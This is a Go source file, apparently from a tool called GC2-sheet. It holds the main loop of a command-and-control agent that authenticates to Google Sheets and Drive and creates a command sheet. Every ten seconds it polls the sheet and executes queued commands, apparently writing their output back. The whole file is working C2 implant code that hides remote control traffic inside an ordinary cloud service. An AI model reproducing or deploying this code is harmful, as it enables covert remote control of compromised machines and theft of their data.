package C2

import (
	"GC2-sheet/internal/authentication"
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"sync"
	"time"
)

func Run (){

	// Perform sheet authentication
	_, clientSheet := authentication.AuthenticateSheet(configuration.GetOptionsCredential())

	// Create new configuration
	spreadSheet := &configuration.SpreadSheet{}

	// Set spreadSheet ID
	spreadSheet.SpreadSheetId = configuration.GetOptionsSheetId()

	// Set drive ID
	spreadSheet.DriveId = configuration.GetOptionsDriveId()

	// Get new sheet name to create
	newSheetName := utils.GenerateNewSheetName()
	// Set sheet name
	spreadSheet.CommandSheet.Name = newSheetName

	// Creating first command
	command := configuration.Commands{
		RangeIn: "!A",
		RangeOut: "!B",
		RangeId: 1,
		Input:   "",
		Output:  "",
	}

	// Add command to pool
	spreadSheet.CommandSheet.CommandsExecution = append(spreadSheet.CommandSheet.CommandsExecution, command)

	// Perform drive authentication
	_, clientDrive := authentication.AuthenticateDrive(configuration.GetOptionsCredential())

	// Creating new sheet inside spreadsheet on program start
	createSheet(clientSheet, spreadSheet)

	// Creating ticker
	ticker := time.NewTicker(10 * time.Second)

	// Creating infinite Waitgroup
	var wg sync.WaitGroup
	wg.Add(1)

	go func() {
		for{
			select {
				case <- ticker.C:
					// Execute in a new thread to avoid deadlock
					go execute(clientSheet, clientDrive, spreadSheet)
			}
		}
	}()

	wg.Wait()

}